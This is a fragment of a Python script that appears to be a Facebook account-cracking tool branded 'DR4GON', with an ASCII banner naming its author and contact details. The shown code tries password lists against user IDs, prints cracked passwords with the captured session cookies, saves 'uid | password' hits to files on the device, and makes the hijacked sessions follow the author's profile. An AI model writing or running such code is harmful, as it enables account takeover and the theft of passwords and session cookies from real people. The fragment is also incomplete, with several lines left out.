...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/shahariarzaman.2022', {
...
\033[0;92 ║█▄▀ █▀▄ ▀▀█ █▄█ █▄█ █░▀█
\033[0;94m╠═══════════════════════════════════════════════════║
\033[0;93m╠══[Author:=======================> \33[1;38mMR. SHAHARIAR\33[1;38m       ║\033[1;31m
╠══[Facebook:=====================> SHAHARIAR ZAMAN      ║  \033[1;97m
╠══[Github:=======================> \33[1;38shahariarzaman001M      ║\33[1;34m
╠══[Whatsapp:=====================> 01533964445     ║\33[1;35m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[DR4GON-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/DR4GON-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/DR4GON-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}DR4GON {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
